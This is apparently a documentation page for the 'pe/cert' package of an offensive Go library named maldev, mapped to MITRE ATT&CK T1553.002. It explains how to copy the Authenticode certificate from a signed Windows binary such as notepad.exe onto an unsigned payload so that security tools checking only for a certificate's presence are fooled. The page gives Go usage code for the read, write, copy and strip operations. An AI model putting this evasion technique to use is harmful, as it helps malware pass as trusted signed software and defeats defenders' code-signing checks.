# PE Certificate Theft

[<- Back to PE Overview](README.md)

**MITRE ATT&CK:** [T1553.002 - Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)
**Package:** `pe/cert`
**Platform:** Cross-platform (PE byte manipulation)
**Detection:** Low

---

## For Beginners

Windows uses Authenticode signatures to verify that executables come from a trusted publisher. This technique copies the digital certificate from a legitimately signed PE (like a Microsoft binary) onto an unsigned payload. The signature won't verify cryptographically, but many security tools only check for certificate *presence*, not *validity*.

---

## How It Works

```mermaid
sequenceDiagram
    participant Signed as Signed PE (e.g., notepad.exe)
    participant Tool as pe/cert
    participant Unsigned as Unsigned Payload

    Tool->>Signed: Read() — extract certificate blob
    Note over Tool: Parse PE headers → Security Directory<br/>(Data Directory index 4, file offset)
    Tool->>Unsigned: Write() — append certificate
    Note over Tool: Pad to 8-byte alignment<br/>Append WIN_CERTIFICATE<br/>Patch Security Directory entry
    Note over Unsigned: Now has Authenticode cert<br/>(signature won't verify but cert is present)
```

**Key detail:** The Security Directory's VirtualAddress field is a *file offset* (not an RVA), which is unique among PE data directories.

---

## Usage

```go
import "github.com/oioio-space/maldev/pe/cert"

// Check if a PE has a certificate
has, _ := cert.Has(`C:\Windows\System32\notepad.exe`)

// Read certificate from signed PE
c, _ := cert.Read(`C:\Windows\System32\notepad.exe`)

// Copy to unsigned payload
cert.Write(`C:\Temp\payload.exe`, c)

// Or copy directly
cert.Copy(`C:\Windows\System32\notepad.exe`, `C:\Temp\payload.exe`)

// Strip certificate from a PE
cert.Strip(`C:\Temp\payload.exe`, "")
```

---

## API Reference

See [pe.md](../../pe.md#pecert----authenticode-certificate-manipulation)
